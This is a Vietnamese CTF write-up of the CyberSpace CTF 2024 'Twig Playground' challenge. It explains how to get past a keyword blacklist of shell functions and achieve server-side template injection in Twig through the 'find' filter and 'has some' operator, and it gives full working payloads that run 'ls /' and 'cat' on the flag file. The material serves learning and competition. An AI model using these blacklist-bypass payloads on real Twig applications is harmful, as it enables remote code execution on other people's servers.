---
title: CyberSpace CTF 2024 write up - Twig Playground
categories: 
    - CTF
slug: cyberspace-ctf-2024
date: 2024-09-03 16:46:31+0000

---

Trong giải CyberSpace này thì team mình đã đạt thứ hạng khá cao là top 2. Nói riêng về mảng web thì team mình còn 1 bài web logic là không kịp làm, cá nhân mình không tự solve được bài nào cả, và bài Twig Playgound là challenge mà mình tốn nhiều thời gian để làm nhất (nhưng vẫn không solve được)
Khi merge lại để chơi chung thì điểm lợi sẽ là mình được trao đổi, học hỏi kiến thức của những teammates khác. Từ đó giảm thiểu việc mình lún quá sâu vào các rabbithole hoặc đi sai hướng. Nhưng nó đã hại mình khá nhiều vì tạo cho mình thói quen xem hướng của anh em trước, khiến việc spot vuln và hàm lỗi của mình trở nên rất kém. Điều này mình đã và đang cố gắng khắc phục, kết quả giải này cho thấy quá trình này vẫn còn rất dài khi mình vẫn chưa thể tự mình làm được 1 challenge nào một cách hẳn hoi.
Mình viết lại write up này cũng chỉ chia sẻ lại góc nhìn của mình về challenge, cũng như những kiến thức mình học được vì mình ấn tượng nhất và thấy bài này khá hay. Thôi không dài dòng nữa, bắt đầu thôi!
# Preface
![image](https://hackmd.io/_uploads/H1fDp8V2A.png)
Đề bài rất straightforward, là một website để render Twig template online, thì mình cũng hiểu được là phải khai thác lỗi SSTI tại challenge này.
# Source Code Analysis
## Dockerfile
```dockerfile!
COPY ./flag /flag
RUN mv /flag /flag-$(head -c 30 /dev/urandom | xxd -p | tr -dc 'a-f' | head -c 10)
```
Flag được move vào / và đổi tên, yêu cầu đưa ra chắc chắn là RCE
## Index.php
Source của challenge rất đơn giản, đưa thẳng input của user vào template để render, nhưng điều mình chú ý là cái đống blacklist này là quá đủ để đá hết các payload của Hacktrick và PayloadAllTheThings ra chuồng gà
```php!
$loader = new \Twig\Loader\ArrayLoader([]);
$twig = new \Twig\Environment($loader, [
    'debug' => true,
]);
$twig->addExtension(new \Twig\Extension\DebugExtension());

$context = [
    'user' => [
        'name' => 'Wesley',
        'age' => 30,
    ],
    'items' => ['Apple', 'Banana', 'Cherry', 'Dragonfruit'],
];

// Ensure no SSTI or RCE vulnerabilities
$blacklist = ['system', 'id', 'passthru', 'exec', 'shell_exec', 'popen', 'proc_open', 'pcntl_exec', '_self', 'reduce', 'env', 'sort', 'map', 'filter', 'replace', 'encoding', 'include', 'file', 'run', 'Closure', 'Callable', 'Process', 'Symfony', '\'', '"', '.', ';', '[', ']', '\\', '/', '-'];

$templateContent = $_POST['input'] ?? '';

foreach ($blacklist as $item) {
    if (stripos($templateContent, $item) !== false) {
        die("Error: The input contains forbidden content: '$item'");
    }
}

try {
    $template = $twig->createTemplate($templateContent);

    $result = $template->render($context);
    echo '<h2>Rendered Output:</h2>';
    echo '<div class="output">';
    echo htmlspecialchars($result);  // Ensure no XSS vulnerabilities
    echo '</div>';
} catch(Exception $e) {
    echo '<div class="error">Something went wrong! Try again.</div>';
}
```
- Ngoài ra tại đây mình thấy họ bật cả DebugExtension(), thì mình có thể sử dụng hàm dump() có tác dụng như hàm var_dump() trong PHP chuyên dùng để xem dữ liệu đầu ra. Tại đây thì mình có thể dump một số thông tin có trong template hiện tại như `_self(đã bị cấm), _context, _charset,...`

Với Twig template thì việc khai thác SSTI chủ yếu phụ thuộc vào cơ chế filter data của Twig cho phép biến đổi dữ liệu tùy theo mục đích sử dụng template. Dữ liệu đi qua filter thông qua dấu `|`, ví dụ ``{{data|filter(args..)}}``. Một số filter thông dụng là slice, upper, lower, join. Nhưng bên cạnh đó có một số filter phổ biến bởi có thể lợi dụng nó để RCE, điểm chung của các filter này là chuyên dùng để xử lý mảng, và mình có thể truyền vào một hàm mũi tên cụ thể để tùy biến quá trình xử lý dữ liệu theo ý mình thích biểu diễn bằng hàm mũi tên. Lúc này mình có thể truyền vào hàm là một system function để thực thi các câu lệnh, còn data sẽ là command, từ đó ta mới có các payload SSTI trên HackTrick sẽ tự tựa nhe kiểu:
```php!
{{["id"]|filter("system")}}
```
Ngoài ra có thể kể đến các filter như: map, sort, filter, reduce -> đều đã bị cấm hết. Tất nhiên, với đống blacklist kia thì mấy payload như này không hoạt động. Nên mình đã đi tìm cách để craft được payload như thế này, nhưng việc khai báo string với mảng là không thể vì chall cũng đã cấm dấu ngoặc vuông là 2 kiểu nháy. Điều này làm mình bế tắc trong 1 khoảng thời gian dài mà không tìm được cách nào, nó làm mình mông lung không xác định được trọng tâm cần phải làm những gì để RCE được challenge này.
Sau khi teammate tìm ra được cách để nối chuỗi là sử dụng dump() và ghép các ký tự trong đấy để thành chuỗi, mình mới xác định được 2 bước cần làm để solve challenge:
- Tìm được cách nối chuỗi các ký tự tùy ý để không phụ thuộc vào context do context giới hạn số lượng từ ngữ.
- Tìm filter có tác dụng RCE tương tự như các filter đã bị blacklist
# Bypass
## Craft String in Twig using {% set ... %}
Với việc cấm tất cả dấu nháy, việc khai báo một string hay array cơ bản là không thể. Tuy nhiên ta có thể dụng dấu `~` để nối chuỗi các string với nhau hoặc các **biến** với nhau. Nên ý tưởng ban đầu là sử dump() -> var_dump ra context hiện tại, dùng slice để lấy từng ký tự trong chuỗi trả ra và nối chúng lại với nhau thành chuỗi.
![image](https://hackmd.io/_uploads/HkN6MqVhC.png)
![image](https://hackmd.io/_uploads/HyfaXq4hC.png)
Với cách này ta có thể tạo thành string, tuy nhiên bị giới hạn về mặt từ ngữ, và việc ghép từng ký tự theo số như này rất mệt, nhất là việc flag có nhiều ký tự như kia mà ta không có ký tự * thì nối đến chết :skull: 
Thay vì lấy từ dump, ta có thể sử dụng `{}` để một tham số thành mảng, nơi giá trị của tham số là value của nó:
![image](https://hackmd.io/_uploads/SkOwrcE3A.png)
Kết hợp nó với dump thì ta có:
![image](https://hackmd.io/_uploads/rybTHqE2C.png)
Tên tham số sytem được đưa vào mảng, với giá trị tương ứng là giá trị của tham số sytem và = NULL -> slice mảng này sẽ dễ hơn slice từng kí tự một khi sử dụng `dump()`
Vậy là ta có thể craft ra các ký tự rồi, nhưng flag nằm ở / và flag cũng chứa dấu - thì ta phải xử lý như thế nào. Khi `_context` không chứa dấu / và nếu ta cũng không thể đưa dấu `*` vào bên trong `dump({})` vì như thế sẽ lỗi ngay:
![image](https://hackmd.io/_uploads/HJkUUcEnC.png)
Vậy nhiệm vụ tiếp theo là cần dấu `/` và dấu `-` bằng cách tiếp tục sử dụng `dump()`
Với dấu `-` thì trong `_charset` ta sẽ thấy có xuất hiện dấu đó nằm trong chuỗi `UTF-8`. Ta lấy ký tự thứ 4, tương ứng với slice(3,1) vì vị trí string bắt đầu đếm từ 0 để lấy dấu `-` ra:
```php!
{% set hyphen = _charset|slice(3,1) %}
```
![image](https://hackmd.io/_uploads/HksWD5V30.png)
Còn dấu `/` thì ta có thể lấy ký tự xuống dòng (sẽ xuất hiện khi dump) sau đó thêm filter `nl2br` để chuyển ký tự xuống dòng thành thẻ HTML `<br/>`, tiếp tục sử dụng filter `raw` để giữ nguyên thẻ không bị html encode, rồi slice lấy dấu `/` bên trong thẻ br:
```php!
{% set slash = dump()|slice(10,1)|nl2br|raw|slice(4,1) %}
```
Ngoài cách sử dụng `{}`, ta cũng có thể sử dụng filter split chuỗi đầu vào với ký tự không tồn tại trong chuỗi để chuyển chuỗi thành mảng, vì công dụng của split là chia chuỗi thành mảng các phần tử theo ký tự xác định
![image](https://hackmd.io/_uploads/S18kYqEnR.png)
## Find Twig filters to RCE
### find
Công cụ đã có đủ cả, giờ thứ mình và đồng đội đã stuck rất lâu mới tìm ra, đó là filters phù hợp để có thể RCE.
Biết được phiên bản Twig đang sử dụng là 3.12, mình tìm kiếm nhưng kết quả no hope, cày hết cái doc các filters của Twig thì toàn cái không dùng được, những cái dùng được đều bị blacklist hết.
Bí ngòi cả 1 ngày thì teammate tìm ra filter `find` có thể được sử dụng để RCE:
![image](https://hackmd.io/_uploads/HJsPKcEh0.png)
Về cách sử dụng thì y chang các filter đã bị blacklist, tự hỏi tại sao nó không ở trong doc thì có lẽ doc upadte chưa tới do filter này mới được thêm vào tại phiên bản 3.11:
![image](https://hackmd.io/_uploads/BJWa55Vn0.png)
Filter này nằm tại file `/Twig/src/Extension/CoreExtension.php`, là một trong các filter có sẵn của Twig, đoạn code xử lý filter này sẽ như sau:
```php!
public function getFilters(): array
{
    ...
    // array helpers
    new TwigFilter('find', [self::class, 'find'], ['needs_environment' => true]),
    ...
}

/**
 * @internal
 */
public static function find(Environment $env, $array, $arrow)
{
    self::checkArrowInSandbox($env, $arrow, 'find', 'filter');

    foreach ($array as $k => $v) {
        if ($arrow($v, $k)) {
            return $v;
        }
    }

    return null;
}
```
- Về cơ bản, ta truyền vào hàm file mảng để xử lý -> $array và tên hàm mũi tên custom đi kèm -> $arrow.
- Hàm sẽ đi duyệt từng phần tử trong mảng, số thứ tự phần tử mảng lưu vào biến $k, nội dung của phần tử đó lưu vào biến $v. Biến $array lúc này sẽ được đưa vào làm tên hàm, với 2 tham số truyền vào lần lượt là nội dung phần tử và thứ tự của phần tử đó. Vừa hay là ta có thể truyền các tham số tương tự như vậy vào các hàm thực thi câu lệnh như:
```php!
system ( string $command [, int &$return_var ] ) : string
passthru ( string $command [, int &$return_var ] )
exec ( string $command [, array &$output [, int &$return_var ]] ) : string
shell_exec ( string $cmd ) : string
```
Từ đó, ta sẽ truyền vào $array giá trị là system hoặc passthru, và truyền vào nội dung mảng là câu lệnh cần thực hiện. Khi đó sẽ tương đương với việc thực thi PHP Code:
```php!
system($command, 0)
passthru($command, 0)
```
Để test thì tạm thời mình comment lại đoạn check blacklist để run cho tiện:
![image](https://hackmd.io/_uploads/SkB-05E3A.png)
### has some
Ngoài filter `find` ra, mình đi lượn github thì có người còn tìm được operator `has some` cũng có thể được sử dụng để RCE, với nguyên lý cũng tương tự `find`:
```php!
public function getOperators(): array
{
    ...
    'has some' => ['precedence' => 20, 'class' => HasSomeBinary::class, 'associativity' => ExpressionParser::OPERATOR_LEFT],
    ...
}

/**
 * @internal
 */
public static function arraySome(Environment $env, $array, $arrow)
{
    self::checkArrowInSandbox($env, $arrow, 'has some', 'operator');

    foreach ($array as $k => $v) {
        if ($arrow($v, $k)) {
            return true;
        }
    }

    return false;
}
```
- Ta vẫn có thể truyền vào một mảng và tên hàm tùy ý, nếu như hàm đó xử lý được sẽ trả về true, còn không trả về false.

Đây là operator nên ta không cần sử dụng dấu `|` để apply filter mà có thể viết thẳng như sau:
```php!
{{["id"] has some "passthru"}}
```
![image](https://hackmd.io/_uploads/Sy4LksN2C.png)
Cách này khá lỏd và có lẽ mình sẽ sử dụng trong một ctf challenge nào đó =)))
# Final Payload & Exploit
Tổng hợp lại để khai thác, đầu tiên mình craft payload `ls /` để đọc flag trước đã, mình sử dụng passthru thay cho system vì đỡ phải nối chuỗi 3 phát=))
```php!
{% set ls = dump({ls})|slice(15,2) %}
{% set pass = dump({pasthru})|slice(15,3)~dump({pasthru})|slice(17,5) %}
{% set hyphen = _charset|slice(3,1) %}
{% set slash = dump()|slice(10,1)|nl2br|raw|slice(4,1) %}
{% set space = dump()|slice(8,1) %}
{% set cmd = ls~space~slash %}
{{ {cmd}|find(pass) }}
```
Mình có được tên flag là: `flag-efbeeaddce`
![image](https://hackmd.io/_uploads/rknefsE20.png)
Giờ thì craft câu lệnh đọc flag thôi:
```php!
{% set cat = dump({cat})|slice(15,3) %}
{% set pass = dump({pasthru})|slice(15,3)~dump({pasthru})|slice(17,5) %}
{% set hyphen = _charset|slice(3,1) %}
{% set slash = dump()|slice(10,1)|nl2br|raw|slice(4,1) %}
{% set space = dump()|slice(8,1) %}
{% set flag = dump({flag})|slice(15,4)~hyphen~dump({efbeeaddce})|slice(15,10) %}
{% set cmd = cat~space~slash~flag %}
{{ {cmd}|find(pass) }}
```
![image](https://hackmd.io/_uploads/Sy-Tzi4h0.png)
Trên server thì flag có tên: `flag-edbfcbcaef`
![image](https://hackmd.io/_uploads/HyvNmsN2A.png)
![image](https://hackmd.io/_uploads/SykPmoNnC.png)
- Flag: **CSCTF{Tw1g_tw1g_ssT1_n0_h4cKtr1ck5_th1S_t1M3}**